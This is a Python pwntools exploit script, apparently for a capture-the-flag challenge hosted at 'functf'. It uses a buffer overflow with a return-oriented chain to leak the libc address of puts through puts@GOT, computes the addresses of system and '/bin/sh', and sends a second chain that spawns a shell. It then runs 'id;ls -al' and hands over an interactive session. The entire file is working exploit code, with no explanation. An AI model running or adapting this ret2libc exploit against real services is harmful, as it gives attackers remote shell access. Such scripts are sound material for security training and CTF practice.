from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18005)

buf=p.recvuntil("Input :")
print hexdump(buf)

puts_got = 0x601018
puts_plt = 0x4005c0
poprdi = 0x400863
main = 0x400788

payload=""
payload+="A"*8
payload+="B"*8
payload+="C"*8
#payload+=p64(0xdeadbeef)
payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main)

p.sendline(payload)

buf=p.recvuntil("Input :")
print hexdump(buf)

libc_elf = ELF("../r64.libc.so.6")
off_puts = libc_elf.sym["puts"]
off_system = libc_elf.sym["system"]
off_bin_sh = libc_elf.search("/bin/sh").next()
libc_puts = u64(buf[0x27:0x27+6]+'\x00\x00')
print 'libc_puts:',hex(libc_puts)
libc_base = libc_puts - off_puts
libc_system = libc_base + off_system
libc_bin_sh = libc_base + off_bin_sh
print 'libc_base:',hex(libc_base)
print 'libc_system:',hex(libc_system)
print 'libc_bin_sh:',hex(libc_bin_sh)
payload=""
payload+="A"*8
payload+="B"*8
payload+="C"*8
payload+=p64(poprdi)
payload+=p64(libc_bin_sh)
payload+=p64(libc_system)

p.sendline(payload)

p.sendline("id;ls -al")

p.interactive()

